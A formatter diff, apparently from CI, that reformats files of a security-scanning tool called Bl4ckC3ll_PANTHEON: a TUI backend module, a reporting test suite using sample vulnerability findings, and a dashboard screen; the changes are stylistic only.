+223,55 @@\n             config_file = Path(__file__).parent.parent / \"p4nth30n.cfg.json\"\n             if config_file.exists():\n                 with open(config_file) as f:\n                     return json.load(f)\n         return {}\n-        \n+\n     @staticmethod\n     def save_config(config_data):\n         \"\"\"Save configuration to file\"\"\"\n         try:\n             config_file = Path(__file__).parent.parent / \"p4nth30n.cfg.json\"\n-            with open(config_file, 'w') as f:\n+            with open(config_file, \"w\") as f:\n                 json.dump(config_data, f, indent=2)\n             return True\n         except Exception:\n             return False\n-            \n+\n \n class TargetManager:\n     \"\"\"Manages target operations for the TUI\"\"\"\n-    \n+\n     @staticmethod\n     def load_targets():\n         \"\"\"Load targets from file\"\"\"\n         try:\n             targets_file = Path(__file__).parent.parent / \"targets.txt\"\n             if targets_file.exists():\n                 content = targets_file.read_text().strip()\n                 if content:\n-                    return [line.strip() for line in content.split('\\n') if line.strip()]\n+                    return [\n+                        line.strip() for line in content.split(\"\\n\") if line.strip()\n+                    ]\n         except Exception as e:\n             logging.warning(f\"Failed to load targets: {e}\")\n         return []\n-        \n+\n     @staticmethod\n     def save_targets(targets_list):\n         \"\"\"Save targets to file\"\"\"\n         try:\n             targets_file = Path(__file__).parent.parent / \"targets.txt\"\n-            targets_file.write_text('\\n'.join(targets_list))\n+            targets_file.write_text(\"\\n\".join(targets_list))\n             return True\n         except Exception:\n             return False\n-            \n+\n \n class ReportManager:\n     \"\"\"Manages report operations for the TUI\"\"\"\n-    \n+\n     @staticmethod\n     def get_available_reports():\n         \"\"\"Get list of available reports\"\"\"\n         reports = []\n         try:\n@@ -267,36 +281,40 @@\n                     if run_dir.is_dir():\n                         report_file = run_dir / \"report\" / \"report.json\"\n                         if report_file.exists():\n                             try:\n                                 report_data = json.loads(report_file.read_text())\n-                                reports.append({\n-                                    'id': run_dir.name,\n-                                    'path': run_dir,\n-                                    'data': report_data\n-                                })\n+                                reports.append(\n+                                    {\n+                                        \"id\": run_dir.name,\n+                                        \"path\": run_dir,\n+                                        \"data\": report_data,\n+                                    }\n+                                )\n                             except Exception:\n                                 continue\n         except Exception as e:\n             logging.warning(f\"Failed to get available reports: {e}\")\n         return reports\n-        \n+\n     @staticmethod\n     def load_report(report_id):\n         \"\"\"Load a specific report\"\"\"\n         try:\n             runs_dir = Path(__file__).parent.parent / \"runs\"\n             for run_dir in runs_dir.iterdir():\n-                if run_dir.is_dir() and (run_dir.name == report_id or report_id in run_dir.name):\n+                if run_dir.is_dir() and (\n+                    run_dir.name == report_id or report_id in run_dir.name\n+                ):\n                     report_file = run_dir / \"report\" / \"report.json\"\n                     if report_file.exists():\n                         return json.loads(report_file.read_text())\n         except Exception as e:\n             logging.warning(f\"Failed to load report: {e}\")\n         return None\n \n \n # Global instances\n scan_manager = ScanManager()\n-config_manager = ConfigManager()  \n+config_manager = ConfigManager()\n target_manager = TargetManager()\n-report_manager = ReportManager()\n\\ No newline at end of file\n+report_manager = ReportManager()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_enhanced_reporting.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_enhanced_reporting.py\t2025-09-14 19:23:14.582903+00:00\n@@ -13,554 +13,590 @@\n import logging\n \n # Add the main directory to Python path\n sys.path.insert(0, str(Path(__file__).parent))\n \n+\n class TestEnhancedReporting(unittest.TestCase):\n     \"\"\"Test enhanced reporting functionality\"\"\"\n-    \n+\n     def setUp(self):\n         \"\"\"Set up test environment\"\"\"\n         self.test_dir = Path(tempfile.mkdtemp())\n         self.report_dir = self.test_dir / \"report\"\n         self.report_dir.mkdir(exist_ok=True)\n-        \n+\n         # Sample vulnerability data for testing\n         self.sample_vulns = [\n             {\n                 \"info\": {\n                     \"name\": \"SQL Injection\",\n                     \"severity\": \"critical\",\n-                    \"description\": \"SQL injection vulnerability found\"\n+                    \"description\": \"SQL injection vulnerability found\",\n                 },\n                 \"template-id\": \"sqli-basic\",\n                 \"matched-at\": \"https://test.example.com/login\",\n-                \"response\": \"SQL error detected\"\n+                \"response\": \"SQL error detected\",\n             },\n             {\n                 \"info\": {\n                     \"name\": \"XSS Vulnerability\",\n                     \"severity\": \"high\",\n-                    \"description\": \"Cross-site scripting vulnerability\"\n+                    \"description\": \"Cross-site scripting vulnerability\",\n                 },\n                 \"template-id\": \"xss-reflected\",\n                 \"matched-at\": \"https://test.example.com/search\",\n-                \"response\": \"XSS payload executed\"\n+                \"response\": \"XSS payload executed\",\n             },\n             {\n                 \"info\": {\n                     \"name\": \"SSL Misconfiguration\",\n                     \"severity\": \"medium\",\n-                    \"description\": \"SSL/TLS configuration issue\"\n+                    \"description\": \"SSL/TLS configuration issue\",\n                 },\n                 \"template-id\": \"ssl-weak-cipher\",\n                 \"matched-at\": \"https://test.example.com\",\n-                \"response\": \"Weak cipher suite detected\"\n-            }\n+                \"response\": \"Weak cipher suite detected\",\n+            },\n         ]\n-        \n+\n         # Sample configuration\n         self.test_config = {\n             \"enhanced_reporting\": {\n                 \"enabled\": True,\n                 \"enable_deep_analysis\": True,\n                 \"enable_correlation\": True,\n                 \"enable_threat_intelligence\": True,\n-                \"enable_narrative_generation\": True\n+                \"enable_narrative_generation\": True,\n             },\n             \"business_context\": {\n                 \"asset_criticality\": 8.0,\n                 \"data_sensitivity\": 9.0,\n                 \"availability_requirement\": 8.5,\n                 \"compliance_requirements\": [\"GDPR\", \"SOX\"],\n                 \"business_hours_impact\": 2.0,\n-                \"revenue_impact_per_hour\": 50000.0\n-            }\n+                \"revenue_impact_per_hour\": 50000.0,\n+            },\n         }\n-        \n+\n         # Sample recon and vuln results\n         self.sample_recon = {\n             \"test.example.com\": {\n                 \"subdomains\": [\"www.test.example.com\", \"api.test.example.com\"],\n-                \"open_ports\": [{\"host\": \"test.example.com\", \"port\": 443, \"proto\": \"tcp\"}],\n-                \"http_info\": [{\"url\": \"https://test.example.com\", \"status_code\": 200}]\n+                \"open_ports\": [\n+                    {\"host\": \"test.example.com\", \"port\": 443, \"proto\": \"tcp\"}\n+                ],\n+                \"http_info\": [{\"url\": \"https://test.example.com\", \"status_code\": 200}],\n             }\n         }\n-        \n+\n         self.sample_vuln_results = {\n             \"test.example.com\": {\n                 \"nuclei_raw\": [json.dumps(vuln) for vuln in self.sample_vulns],\n                 \"nuclei_parsed\": {\n                     \"critical\": [self.sample_vulns[0]],\n                     \"high\": [self.sample_vulns[1]],\n                     \"medium\": [self.sample_vulns[2]],\n                     \"low\": [],\n-                    \"info\": []\n-                },\n-                \"risk_score\": 25\n+                    \"info\": [],\n+                },\n+                \"risk_score\": 25,\n             }\n         }\n-    \n+\n     def tearDown(self):\n         \"\"\"Clean up test environment\"\"\"\n         if self.test_dir.exists():\n             shutil.rmtree(self.test_dir)\n-    \n+\n     def test_intelligent_report_analyzer_import(self):\n         \"\"\"Test that intelligent report analyzer can be imported\"\"\"\n         try:\n             from intelligent_report_engine import IntelligentReportAnalyzer\n+\n             analyzer = IntelligentReportAnalyzer(self.test_config)\n             self.assertIsNotNone(analyzer)\n             self.assertIsNotNone(analyzer.config)\n             self.assertIsNotNone(analyzer.logger)\n         except ImportError as e:\n             self.fail(f\"Failed to import IntelligentReportAnalyzer: {e}\")\n-    \n+\n     def test_vulnerability_context_creation(self):\n         \"\"\"Test vulnerability context creation\"\"\"\n         try:\n             from intelligent_report_engine import IntelligentReportAnalyzer\n+\n             analyzer = IntelligentReportAnalyzer(self.test_config)\n-            \n+\n             # Analyze sample vulnerabilities\n-            enhanced_vulns = analyzer.analyze_vulnerability_intelligence(self.sample_vulns)\n-            \n+            enhanced_vulns = analyzer.analyze_vulnerability_intelligence(\n+                self.sample_vulns\n+            )\n+\n             self.assertGreater(len(enhanced_vulns), 0)\n-            \n+\n             # Check that enhanced vulnerabilities have required attributes\n             for vuln in enhanced_vulns:\n-                self.assertTrue(hasattr(vuln, 'cvss_score'))\n-                self.assertTrue(hasattr(vuln, 'exploitability'))\n-                self.assertTrue(hasattr(vuln, 'confidence'))\n-                self.assertTrue(hasattr(vuln, 'business_impact'))\n-                self.assertTrue(hasattr(vuln, 'attack_vector'))\n-                \n+                self.assertTrue(hasattr(vuln, \"cvss_score\"))\n+                self.assertTrue(hasattr(vuln, \"exploitability\"))\n+                self.assertTrue(hasattr(vuln, \"confidence\"))\n+                self.assertTrue(hasattr(vuln, \"business_impact\"))\n+                self.assertTrue(hasattr(vuln, \"attack_vector\"))\n+\n                 # Validate score ranges\n                 self.assertGreaterEqual(vuln.cvss_score, 0.0)\n                 self.assertLessEqual(vuln.cvss_score, 10.0)\n                 self.assertGreaterEqual(vuln.exploitability, 0.0)\n                 self.assertLessEqual(vuln.exploitability, 1.0)\n                 self.assertGreaterEqual(vuln.confidence, 0.0)\n                 self.assertLessEqual(vuln.confidence, 1.0)\n-                \n+\n         except Exception as e:\n             self.fail(f\"Vulnerability context creation failed: {e}\")\n-    \n+\n     def test_advanced_risk_calculator(self):\n         \"\"\"Test advanced risk calculation\"\"\"\n         try:\n-            from intelligent_report_engine import AdvancedRiskCalculator, IntelligentReportAnalyzer\n-            \n+            from intelligent_report_engine import (\n+                AdvancedRiskCalculator,\n+                IntelligentReportAnalyzer,\n+            )\n+\n             analyzer = IntelligentReportAnalyzer(self.test_config)\n-            enhanced_vulns = analyzer.analyze_vulnerability_intelligence(self.sample_vulns)\n-            \n+            enhanced_vulns = analyzer.analyze_vulnerability_intelligence(\n+                self.sample_vulns\n+            )\n+\n             risk_calculator = AdvancedRiskCalculator()\n             risk_assessment = risk_calculator.calculate_contextual_risk(enhanced_vulns)\n-            \n+\n             # Validate risk assessment structure\n             self.assertIn(\"overall_risk_score\", risk_assessment)\n             self.assertIn(\"risk_level\", risk_assessment)\n             self.assertIn(\"business_impact_score\", risk_assessment)\n             self.assertIn(\"severity_breakdown\", risk_assessment)\n             self.assertIn(\"recommendations\", risk_assessment)\n-            \n+\n             # Validate risk level is appropriate\n-            self.assertIn(risk_assessment[\"risk_level\"], [\"CRITICAL\", \"HIGH\", \"MEDIUM\", \"LOW\", \"MINIMAL\"])\n-            \n+            self.assertIn(\n+                risk_assessment[\"risk_level\"],\n+                [\"CRITICAL\", \"HIGH\", \"MEDIUM\", \"LOW\", \"MINIMAL\"],\n+            )\n+\n             # Validate recommendations are provided\n             self.assertIsInstance(risk_assessment[\"recommendations\"], list)\n             self.assertGreater(len(risk_assessment[\"recommendations\"]), 0)\n-            \n+\n         except Exception as e:\n             self.fail(f\"Advanced risk calculation failed: {e}\")\n-    \n+\n     def test_vulnerability_correlation_engine(self):\n         \"\"\"Test vulnerability correlation analysis\"\"\"\n         try:\n-            from intelligent_report_engine import VulnerabilityCorrelationEngine, IntelligentReportAnalyzer\n-            \n+            from intelligent_report_engine import (\n+                VulnerabilityCorrelationEngine,\n+                IntelligentReportAnalyzer,\n+            )\n+\n             analyzer = IntelligentReportAnalyzer(self.test_config)\n-            enhanced_vulns = analyzer.analyze_vulnerability_intelligence(self.sample_vulns)\n-            \n+            enhanced_vulns = analyzer.analyze_vulnerability_intelligence(\n+                self.sample_vulns\n+            )\n+\n             correlation_engine = VulnerabilityCorrelationEngine()\n             correlations = correlation_engine.analyze_correlations(enhanced_vulns)\n-            \n+\n             # Validate correlation structure\n             self.assertIn(\"attack_chains\", correlations)\n             self.assertIn(\"vulnerability_clusters\", correlations)\n             self.assertIn(\"amplification_scenarios\", correlations)\n             self.assertIn(\"dependency_graph\", correlations)\n             self.assertIn(\"risk_amplification_factor\", correlations)\n-            \n+\n             # Validate data types\n             self.assertIsInstance(correlations[\"attack_chains\"], list)\n             self.assertIsInstance(correlations[\"vulnerability_clusters\"], list)\n             self.assertIsInstance(correlations[\"amplification_scenarios\"], list)\n             self.assertIsInstance(correlations[\"dependency_graph\"], dict)\n-            self.assertIsInstance(correlations[\"risk_amplification_factor\"], (int, float))\n-            \n+            self.assertIsInstance(\n+                correlations[\"risk_amplification_factor\"], (int, float)\n+            )\n+\n         except Exception as e:\n             self.fail(f\"Vulnerability correlation analysis failed: {e}\")\n-    \n+\n     def test_threat_intelligence_aggregator(self):\n         \"\"\"Test threat intelligence aggregation\"\"\"\n         try:\n-            from intelligent_report_engine import ThreatIntelligenceAggregator, IntelligentReportAnalyzer\n-            \n+            from intelligent_report_engine import (\n+                ThreatIntelligenceAggregator,\n+                IntelligentReportAnalyzer,\n+            )\n+\n             analyzer = IntelligentReportAnalyzer(self.test_config)\n-            enhanced_vulns = analyzer.analyze_vulnerability_intelligence(self.sample_vulns)\n-            \n+            enhanced_vulns = analyzer.analyze_vulnerability_intelligence(\n+                self.sample_vulns\n+            )\n+\n             threat_aggregator = ThreatIntelligenceAggregator(self.test_config)\n             threat_intel = threat_aggregator.aggregate_threat_intelligence(\n                 enhanced_vulns, [\"test.example.com\"]\n             )\n-            \n+\n             # Validate threat intelligence structure\n-            self.assertTrue(hasattr(threat_intel, 'reputation_score'))\n-            self.assertTrue(hasattr(threat_intel, 'known_malicious_ips'))\n-            self.assertTrue(hasattr(threat_intel, 'suspicious_domains'))\n-            self.assertTrue(hasattr(threat_intel, 'threat_feeds'))\n-            \n+            self.assertTrue(hasattr(threat_intel, \"reputation_score\"))\n+            self.assertTrue(hasattr(threat_intel, \"known_malicious_ips\"))\n+            self.assertTrue(hasattr(threat_intel, \"suspicious_domains\"))\n+            self.assertTrue(hasattr(threat_intel, \"threat_feeds\"))\n+\n             # Validate reputation score range\n             self.assertGreaterEqual(threat_intel.reputation_score, 0.0)\n             self.assertLessEqual(threat_intel.reputation_score, 100.0)\n-            \n+\n         except Exception as e:\n             self.fail(f\"Threat intelligence aggregation failed: {e}\")\n-    \n+\n     def test_enhanced_report_controller(self):\n         \"\"\"Test enhanced report controller integration\"\"\"\n         try:\n             from enhanced_report_controller import EnhancedReportController\n-            \n+\n             # Create logger for testing\n             logger = logging.getLogger(\"test_logger\")\n-            \n+\n             controller = EnhancedReportController(self.test_config, logger)\n-            \n+\n             # Test report generation\n             enhanced_report = controller.generate_enhanced_report(\n                 self.test_dir,\n                 self.sample_recon,\n                 self.sample_vuln_results,\n-                [\"test.example.com\"]\n-            )\n-            \n+                [\"test.example.com\"],\n+            )\n+\n             # Validate enhanced report structure\n             self.assertIn(\"report_metadata\", enhanced_report)\n             self.assertIn(\"executive_summary\", enhanced_report)\n             self.assertIn(\"risk_assessment\", enhanced_report)\n             self.assertIn(\"vulnerability_analysis\", enhanced_report)\n             self.assertIn(\"recommendations\", enhanced_report)\n-            \n+\n             # Validate metadata\n             metadata = enhanced_report[\"report_metadata\"]\n             self.assertIn(\"analysis_engine_version\", metadata)\n             self.assertIn(\"total_vulnerabilities\", metadata)\n             self.assertIn(\"analysis_depth\", metadata)\n-            \n+\n             # Validate executive summary has business context\n             exec_summary = enhanced_report[\"executive_summary\"]\n             self.assertIn(\"security_posture\", exec_summary)\n             self.assertIn(\"business_impact\", exec_summary)\n             self.assertIn(\"key_insights\", exec_summary)\n-            \n+\n         except Exception as e:\n             self.fail(f\"Enhanced report controller test failed: {e}\")\n-    \n+\n     def test_enhanced_html_report_generation(self):\n         \"\"\"Test enhanced HTML report generation\"\"\"\n         try:\n             # Test the HTML report generation function\n             from bl4ckc3ll_p4nth30n import generate_enhanced_intelligent_html_report\n-            \n+\n             # Create sample enhanced report data\n             enhanced_report_data = {\n                 \"report_metadata\": {\n                     \"run_id\": \"test_run\",\n                     \"analysis_engine_version\": \"9.0.0-test\",\n                     \"generation_timestamp\": \"2024-01-01T12:00:00\",\n-                    \"analysis_depth\": \"DEEP\"\n+                    \"analysis_depth\": \"DEEP\",\n                 },\n                 \"executive_summary\": {\n                     \"scan_overview\": {\n                         \"targets_scanned\": 1,\n                         \"subdomains_discovered\": 2,\n-                        \"scan_completion_time\": \"2024-01-01 12:00:00\"\n+                        \"scan_completion_time\": \"2024-01-01 12:00:00\",\n                     },\n                     \"security_posture\": {\n                         \"overall_risk_level\": \"HIGH\",\n                         \"vulnerabilities_found\": 3,\n-                        \"critical_findings_count\": 1\n+                        \"critical_findings_count\": 1,\n                     },\n                     \"business_impact\": {\n                         \"impact_score\": 75.0,\n                         \"time_to_compromise\": \"Hours\",\n                         \"estimated_financial_impact\": {\n                             \"total_potential_impact\": 100000\n-                        }\n+                        },\n                     },\n                     \"key_insights\": [\n                         {\n                             \"priority\": \"HIGH\",\n                             \"title\": \"Critical SQL Injection Found\",\n                             \"description\": \"Database access vulnerability detected\",\n-                            \"business_implication\": \"Potential data breach\"\n+                            \"business_implication\": \"Potential data breach\",\n                         }\n-                    ]\n+                    ],\n                 },\n                 \"risk_assessment\": {\n                     \"overall_risk_score\": 75.0,\n                     \"risk_level\": \"HIGH\",\n                     \"attack_vector_distribution\": {\n                         \"web_application\": {\"count\": 2, \"percentage\": 66.7},\n-                        \"network\": {\"count\": 1, \"percentage\": 33.3}\n-                    }\n-                },\n-                \"threat_intelligence\": {\n-                    \"reputation_score\": 85.0\n-                },\n+                        \"network\": {\"count\": 1, \"percentage\": 33.3},\n+                    },\n+                },\n+                \"threat_intelligence\": {\"reputation_score\": 85.0},\n                 \"vulnerability_analysis\": {\n                     \"correlation_analysis\": {\n                         \"attack_chains\": [\n                             {\n                                 \"name\": \"SQL Injection Chain\",\n                                 \"target\": \"test.example.com\",\n-                                \"risk_multiplier\": 2.0\n+                                \"risk_multiplier\": 2.0,\n                             }\n                         ]\n                     },\n                     \"attack_surface_analysis\": {\n                         \"surface_metrics\": {\n                             \"total_targets\": 1,\n                             \"total_services\": 1,\n-                            \"vulnerability_density\": 3.0\n+                            \"vulnerability_density\": 3.0,\n                         }\n-                    }\n+                    },\n                 },\n                 \"executive_narrative\": {\n                     \"executive_storyline\": [\n                         {\n                             \"section\": \"Situation Assessment\",\n-                            \"content\": \"Critical security vulnerabilities detected requiring immediate attention.\"\n+                            \"content\": \"Critical security vulnerabilities detected requiring immediate attention.\",\n                         }\n                     ],\n                     \"board_summary\": {\n                         \"headline\": \"High-risk security vulnerabilities identified\",\n-                        \"timeline\": \"Immediate action required\"\n-                    }\n+                        \"timeline\": \"Immediate action required\",\n+                    },\n                 },\n                 \"remediation_roadmap\": {\n                     \"immediate_actions\": {\n                         \"timeline\": \"0-24 hours\",\n                         \"success_criteria\": \"Critical vulnerabilities patched\",\n                         \"actions\": [\n                             {\n                                 \"vulnerability\": \"sqli-basic\",\n                                 \"target\": \"test.example.com\",\n                                 \"effort\": \"Medium\",\n-                                \"justification\": \"Prevents data breach\"\n+                                \"justification\": \"Prevents data breach\",\n                             }\n-                        ]\n+                        ],\n                     }\n                 },\n                 \"recommendations\": {\n                     \"immediate_actions\": [\n                         \"Patch SQL injection vulnerability immediately\",\n-                        \"Review authentication mechanisms\"\n+                        \"Review authentication mechanisms\",\n                     ],\n                     \"strategic_initiatives\": [\n                         \"Implement Web Application Firewall\",\n-                        \"Enhance security monitoring\"\n+                        \"Enhance security monitoring\",\n                     ],\n                     \"monitoring_improvements\": [\n                         \"Deploy SIEM solution\",\n-                        \"Implement continuous vulnerability scanning\"\n-                    ]\n+                        \"Implement continuous vulnerability scanning\",\n+                    ],\n                 },\n                 \"appendices\": {\n-                    \"analysis_confidence\": {\n-                        \"overall_confidence\": \"HIGH\"\n-                    },\n+                    \"analysis_confidence\": {\"overall_confidence\": \"HIGH\"},\n                     \"methodology\": {\n                         \"analysis_framework\": \"Bl4ckC3ll_PANTHEON Enhanced Intelligence Engine\"\n-                    }\n-                }\n+                    },\n+                },\n             }\n-            \n+\n             # Generate HTML report\n-            generate_enhanced_intelligent_html_report(enhanced_report_data, self.report_dir)\n-            \n+            generate_enhanced_intelligent_html_report(\n+                enhanced_report_data, self.report_dir\n+            )\n+\n             # Check that HTML file was created\n             html_file = self.report_dir / \"intelligent_report.html\"\n             self.assertTrue(html_file.exists())\n-            \n+\n             # Check HTML content contains expected elements\n             html_content = html_file.read_text()\n             self.assertIn(\"Intelligent Security Assessment Report\", html_content)\n             self.assertIn(\"Executive Summary\", html_content)\n             self.assertIn(\"Threat Intelligence\", html_content)\n             self.assertIn(\"Vulnerability Analysis\", html_content)\n             self.assertIn(\"Remediation Roadmap\", html_content)\n             self.assertIn(\"test_run\", html_content)\n-            \n+\n         except Exception as e:\n             self.fail(f\"Enhanced HTML report generation failed: {e}\")\n-    \n+\n     def test_integration_with_main_orchestrator(self):\n         \"\"\"Test integration with main orchestrator\"\"\"\n         try:\n             # Test that enhanced reporting can be imported and configured\n             import bl4ckc3ll_p4nth30n as main\n-            \n+\n             # Check default configuration includes enhanced reporting\n             cfg = main.DEFAULT_CFG\n             self.assertIn(\"enhanced_reporting\", cfg)\n             self.assertTrue(cfg[\"enhanced_reporting\"][\"enabled\"])\n             self.assertIn(\"business_context\", cfg[\"enhanced_reporting\"])\n-            \n+\n             # Test configuration validation\n             enhanced_config = cfg[\"enhanced_reporting\"]\n             self.assertIn(\"enable_deep_analysis\", enhanced_config)\n             self.assertIn(\"enable_correlation\", enhanced_config)\n             self.assertIn(\"enable_threat_intelligence\", enhanced_config)\n             self.assertIn(\"enable_narrative_generation\", enhanced_config)\n-            \n+\n             business_context = enhanced_config[\"business_context\"]\n             self.assertIn(\"asset_criticality\", business_context)\n             self.assertIn(\"compliance_requirements\", business_context)\n             self.assertIn(\"revenue_impact_per_hour\", business_context)\n-            \n+\n         except Exception as e:\n             self.fail(f\"Integration test failed: {e}\")\n-    \n+\n     def test_performance_and_error_handling(self):\n         \"\"\"Test performance and error handling\"\"\"\n         try:\n             from intelligent_report_engine import IntelligentReportAnalyzer\n-            \n+\n             # Test with empty data\n             analyzer = IntelligentReportAnalyzer(self.test_config)\n             empty_result = analyzer.analyze_vulnerability_intelligence([])\n             self.assertEqual(len(empty_result), 0)\n-            \n+\n             # Test with malformed vulnerability data\n             malformed_vulns = [\n                 {\"invalid\": \"data\"},\n                 {\"info\": {}, \"template-id\": \"test\"},\n                 None,\n-                \"\"\n+                \"\",\n             ]\n-            \n+\n             # Should handle gracefully without crashing\n             result = analyzer.analyze_vulnerability_intelligence(malformed_vulns)\n             self.assertIsInstance(result, list)\n-            \n+\n         except Exception as e:\n             self.fail(f\"Performance and error handling test failed: {e}\")\n \n \n class TestReportingFeatures(unittest.TestCase):\n     \"\"\"Test specific reporting features\"\"\"\n-    \n+\n     def test_executive_narrative_generation(self):\n         \"\"\"Test executive narrative generation\"\"\"\n         try:\n             from enhanced_report_controller import EnhancedReportController\n             import logging\n-            \n-            config = {\n-                \"enhanced_reporting\": {\n-                    \"enable_narrative_generation\": True\n-                }\n-            }\n-            \n+\n+            config = {\"enhanced_reporting\": {\"enable_narrative_generation\": True}}\n+\n             logger = logging.getLogger(\"test\")\n             controller = EnhancedReportController(config, logger)\n-            \n+\n             # Test narrative generation components exist\n-            self.assertTrue(hasattr(controller, 'narrative_generation'))\n+            self.assertTrue(hasattr(controller, \"narrative_generation\"))\n             self.assertTrue(controller.narrative_generation)\n-            \n+\n         except Exception as e:\n             self.fail(f\"Executive narrative test failed: {e}\")\n-    \n+\n     def test_business_impact_calculation(self):\n         \"\"\"Test business impact calculation\"\"\"\n         try:\n-            from intelligent_report_engine import AdvancedRiskCalculator, BusinessContext\n-            \n+            from intelligent_report_engine import (\n+                AdvancedRiskCalculator,\n+                BusinessContext,\n+            )\n+\n             # Create business context with specific values\n             business_context = BusinessContext(\n                 asset_criticality=9.0,\n                 data_sensitivity=8.0,\n                 availability_requirement=7.0,\n                 compliance_requirements=[\"GDPR\", \"HIPAA\"],\n                 business_hours_impact=2.0,\n-                revenue_impact_per_hour=100000.0\n-            )\n-            \n+                revenue_impact_per_hour=100000.0,\n+            )\n+\n             calculator = AdvancedRiskCalculator(business_context)\n-            \n+\n             # Validate business context is applied\n             self.assertEqual(calculator.business_context.asset_criticality, 9.0)\n-            self.assertEqual(calculator.business_context.revenue_impact_per_hour, 100000.0)\n-            \n+            self.assertEqual(\n+                calculator.business_context.revenue_impact_per_hour, 100000.0\n+            )\n+\n         except Exception as e:\n             self.fail(f\"Business impact calculation test failed: {e}\")\n \n \n def run_enhanced_reporting_tests():\n     \"\"\"Run all enhanced reporting tests\"\"\"\n     print(\"\\n\ud83e\uddea Starting Enhanced Reporting Test Suite\")\n     print(\"=\" * 60)\n-    \n+\n     # Create test suite\n     loader = unittest.TestLoader()\n     suite = unittest.TestSuite()\n-    \n+\n     # Add test classes\n     suite.addTests(loader.loadTestsFromTestCase(TestEnhancedReporting))\n     suite.addTests(loader.loadTestsFromTestCase(TestReportingFeatures))\n-    \n+\n     # Run tests\n     runner = unittest.TextTestRunner(verbosity=2)\n     result = runner.run(suite)\n-    \n+\n     # Print summary\n     print(\"\\n\" + \"=\" * 60)\n     print(\"\ud83d\udcca ENHANCED REPORTING TEST SUMMARY\")\n     print(\"=\" * 60)\n     print(f\"Total Tests Run: {result.testsRun}\")\n     print(f\"Successful: {result.testsRun - len(result.failures) - len(result.errors)}\")\n     print(f\"Failures: {len(result.failures)}\")\n     print(f\"Errors: {len(result.errors)}\")\n-    \n+\n     if result.failures:\n         print(\"\\n\u274c FAILURES:\")\n         for test, traceback in result.failures:\n             print(f\"  - {test}: {traceback.split('AssertionError:')[-1].strip()}\")\n-    \n+\n     if result.errors:\n         print(\"\\n\ud83d\udea8 ERRORS:\")\n         for test, traceback in result.errors:\n             print(f\"  - {test}: {traceback.split('Error:')[-1].strip()}\")\n-    \n-    success_rate = ((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100) if result.testsRun > 0 else 0\n+\n+    success_rate = (\n+        (\n+            (result.testsRun - len(result.failures) - len(result.errors))\n+            / result.testsRun\n+            * 100\n+        )\n+        if result.testsRun > 0\n+        else 0\n+    )\n     print(f\"\\nSuccess Rate: {success_rate:.1f}%\")\n-    \n+\n     if success_rate >= 90:\n         print(\"\ud83c\udf89 Enhanced reporting system is working excellently!\")\n     elif success_rate >= 75:\n         print(\"\u2705 Enhanced reporting system is working well with minor issues.\")\n     elif success_rate >= 50:\n         print(\"\u26a0\ufe0f  Enhanced reporting system has some issues that need attention.\")\n     else:\n-        print(\"\u274c Enhanced reporting system has significant issues that need immediate attention.\")\n-    \n+        print(\n+            \"\u274c Enhanced reporting system has significant issues that need immediate attention.\"\n+        )\n+\n     return result.wasSuccessful()\n \n \n if __name__ == \"__main__\":\n     success = run_enhanced_reporting_tests()\n-    exit(0 if success else 1)\n\\ No newline at end of file\n+    exit(0 if success else 1)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/main_dashboard.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/main_dashboard.py\t2025-09-14 19:23:14.625362+00:00\n@@ -16,122 +16,133 @@\n from pathlib import Path\n \n # Try to import psutil, fallback gracefully\n try:\n     import psutil\n+\n     HAS_PSUTIL = True\n except ImportError:\n     HAS_PSUTIL = False\n \n # Import backend integration\n try:\n-    from ..backend_integration import scan_manager, config_manager, target_manager, report_manager\n+    from ..backend_integration import (\n+        scan_manager,\n+        config_manager,\n+        target_manager,\n+        report_manager,\n+    )\n+\n     HAS_BACKEND = True\n except ImportError:\n     HAS_BACKEND = False\n \n \n class SystemInfoWidget(Static):\n     \"\"\"System information display widget\"\"\"\n-    \n+\n     def compose(self):\n         yield Label(\"System Information\", classes=\"widget-title\")\n-        yield Label(f\"OS: {platform.system()} {platform.release()}\", classes=\"info-item\")\n+        yield Label(\n+            f\"OS: {platform.system()} {platform.release()}\", classes=\"info-item\"\n+        )\n         yield Label(f\"Python: {platform.python_version()}\", classes=\"info-item\")\n         yield Label(f\"Architecture: {platform.machine()}\", classes=\"info-item\")\n         yield Label(f\"Hostname: {platform.node()}\", classes=\"info-item\")\n \n \n class ResourceMonitor(Static):\n     \"\"\"Real-time system resource monitoring\"\"\"\n-    \n+\n     cpu_usage = reactive(0.0)\n-    memory_usage = reactive(0.0) \n+    memory_usage = reactive(0.0)\n     disk_usage = reactive(0.0)\n-    \n+\n     def compose(self):\n         yield Label(\"Resource Monitor\", classes=\"widget-title\")\n-        \n+\n         with Vertical():\n             yield Label(\"CPU Usage:\", classes=\"metric-label\")\n             yield ProgressBar(total=100, show_percentage=True, id=\"cpu-bar\")\n-            \n-            yield Label(\"Memory Usage:\", classes=\"metric-label\")  \n+\n+            yield Label(\"Memory Usage:\", classes=\"metric-label\")\n             yield ProgressBar(total=100, show_percentage=True, id=\"memory-bar\")\n-            \n+\n             yield Label(\"Disk Usage:\", classes=\"metric-label\")\n             yield ProgressBar(total=100, show_percentage=True, id=\"disk-bar\")\n-            \n+\n     def on_mount(self):\n         \"\"\"Start resource monitoring\"\"\"\n         self.set_interval(1.0, self.update_resources)\n-        \n+\n     def update_resources(self):\n         \"\"\"Update resource usage metrics\"\"\"\n         if not HAS_PSUTIL:\n             return\n-            \n+\n         try:\n             # Get system metrics\n             self.cpu_usage = psutil.cpu_percent(interval=None)\n             memory = psutil.virtual_memory()\n             self.memory_usage = memory.percent\n-            disk = psutil.disk_usage('/')\n+            disk = psutil.disk_usage(\"/\")\n             self.disk_usage = (disk.used / disk.total) * 100\n-            \n+\n             # Update progress bars\n             cpu_bar = self.query_one(\"#cpu-bar\", ProgressBar)\n-            memory_bar = self.query_one(\"#memory-bar\", ProgressBar) \n+            memory_bar = self.query_one(\"#memory-bar\", ProgressBar)\n             disk_bar = self.query_one(\"#disk-bar\", ProgressBar)\n-            \n+\n             cpu_bar.progress = self.cpu_usage\n             